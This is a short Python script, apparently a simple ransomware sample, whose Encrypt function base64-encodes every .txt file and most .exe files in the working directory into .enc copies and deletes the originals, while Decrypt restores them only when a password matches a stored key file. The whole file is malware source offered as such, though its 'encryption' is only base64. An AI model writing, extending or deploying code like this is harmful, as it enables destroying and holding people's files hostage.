import base64
import os
import hashlib

def GeneratePassword(password):
    with open('key.key', 'wb') as keyfile:
        keyfile.write(base64.b64encode(hashlib.sha256(password.encode('utf-8')).hexdigest().encode('utf-8')))
        keyfile.close()

def Encrypt():
    list_dir = os.listdir(path=os.getcwd())
    for txt in list_dir:
        if txt.endswith('.txt') or txt.endswith('.exe') and not txt == "ramsomware.exe" and not txt == "generator.exe":
            with open(txt, 'rb') as file:
                data = file.read()
                data = base64.b64encode(data)
                with open(txt+'.enc', 'wb') as ency:
                    ency.write(data)
                    ency.close()
                file.close()
                os.remove(txt)
def Decrypt(password):
    list_dir = os.listdir(path=os.getcwd())
    if(os.path.isfile('key.key')):
        with open('key.key', 'rb') as keyfile:
            data = keyfile.read()
            keyfile.close()
            if(base64.b64encode(hashlib.sha256(password.encode('utf-8')).hexdigest().encode('utf-8')) == data):
                for enc in list_dir:
                    if enc.endswith('.txt.enc') or enc.endswith('.exe.enc'):
                        with open(enc, 'rb') as file:
                            data = file.read()
                            data = base64.b64decode(data)
                            fileExt = enc.split('.')
                            with open(fileExt[0]+"."+fileExt[1], 'wb') as decy:
                                decy.write(data)
                                decy.close()
                            file.close()
                            os.remove(enc)
            else:
                print('key file not working')
    else:
        print('missing key file')